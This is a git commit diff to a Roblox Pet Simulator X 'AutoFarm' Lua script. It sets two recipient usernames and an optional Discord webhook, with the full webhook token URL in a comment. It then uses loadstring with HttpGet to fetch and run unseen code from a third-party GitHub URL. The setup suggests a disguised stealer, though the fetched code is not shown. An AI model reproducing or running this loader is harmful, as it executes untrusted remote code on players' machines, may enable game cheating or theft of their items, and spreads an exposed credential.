5a3af3eb19ca64722ff706f4f45fced1e8c440dc
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-07-01 21:46:22 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,2 +1,5 @@
-_G.UserName = "zenn2345"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+_G.UserName = " " -- Zenn2345 
+_G.UserName2 = " " -- MYFAVORANGE
+_G.Webhook = " " -- https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c - optional
+   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
